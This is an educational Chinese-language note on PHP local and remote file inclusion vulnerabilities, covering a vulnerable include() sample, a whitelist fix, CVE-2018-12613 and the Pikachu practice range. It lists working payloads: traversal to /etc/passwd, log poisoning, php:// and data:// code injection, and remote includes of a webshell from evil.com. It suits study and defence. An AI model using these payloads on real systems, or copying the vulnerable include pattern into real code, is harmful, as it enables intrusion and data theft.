# 文件包含漏洞 (File Inclusion)

## 原理

文件包含漏洞发生在应用程序使用动态方式包含文件时，用户能够控制被包含文件的路径。攻击者可以包含意外文件，导致敏感信息泄露或代码执行。

根本原因：**使用用户输入作为文件路径，没有充分校验**。

## 两种类型

### 本地文件包含（LFI - Local File Inclusion）

包含服务器上的本地文件。

```
http://example.com/page.php?file=../../../../etc/passwd
http://example.com/page.php?file=../../windows/system32/drivers/etc/hosts
```

### 远程文件包含（RFI - Remote File Inclusion）

包含远程服务器上的文件（需要 `allow_url_include=On`）。

```
http://example.com/page.php?file=http://evil.com/shell.txt
```

RFI 比 LFI 危害更大，因为攻击者可以直接执行任意代码。

## 常见危险函数

| 语言 | 函数 | 说明 |
|------|------|------|
| PHP | `include()` | 包含文件，失败时警告 |
| PHP | `include_once()` | 同上，但只包含一次 |
| PHP | `require()` | 包含文件，失败时致命错误 |
| PHP | `require_once()` | 同上，但只包含一次 |

## 示例

### 有漏洞的代码

```php
<?php
// 危险
$page = $_GET['page'];
include($page . '.php');
?>
```

#### LFI 攻击
```
?page=../../../etc/passwd
?page=../../../var/log/apache2/access.log   （日志投毒后执行代码）
?page=php://filter/convert.base64-encode/resource=config  （PHP 伪协议读取源码）
```

#### RFI 攻击
```
?page=http://evil.com/webshell.txt
?page=data:text/plain,<?php system('whoami');?>   （data 协议直接注入）
```

## 利用技巧

| 技巧 | 说明 |
|------|------|
| 路径遍历 | `../../../etc/passwd` 跳出目录 |
| PHP 伪协议 | `php://filter` 读取源码，`php://input` 写入代码 |
| data 协议 | `data://text/plain;base64,...` 直接执行代码 |
| 日志注入 | 先写恶意代码到日志文件，再包含日志文件 |
| `/proc/self/environ` | 包含环境变量（可写入 User-Agent 中的代码） |
| Session 文件 | 包含 PHP Session 文件（可写入 Session 中的代码） |

## 防御

| 防御措施 | 说明 |
|----------|------|
| 白名单 | 只允许包含预先定义的几个文件 |
| 禁用远程包含 | `allow_url_include = Off` |
| 路径校验 | 禁止路径中出现 `../` |
| 关闭伪协议 | 控制 `allow_url_fopen` 等配置 |
| 使用绝对路径 | 避免基于用户输入的相对路径 |

### 安全代码示例

```php
<?php
// 安全：白名单
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages, true)) {
    include(__DIR__ . '/pages/' . $page . '.php');
} else {
    include(__DIR__ . '/pages/home.php');
}
?>
```

## 真实案例

### 案例：phpMyAdmin 文件包含漏洞（CVE-2018-12613）
- 漏洞：phpMyAdmin 4.8.x 中 `index.php` 存在文件包含
- 利用：通过 `?target=db_sql.php%253f/...` 绕过限制
- 后果：攻击者可以包含任意文件，导致信息泄露或 RCE

## 在 Pikachu 靶场中的对应模块

Pikachu 提供了本地文件包含（LFI）和远程文件包含（RFI）两个练习场景。
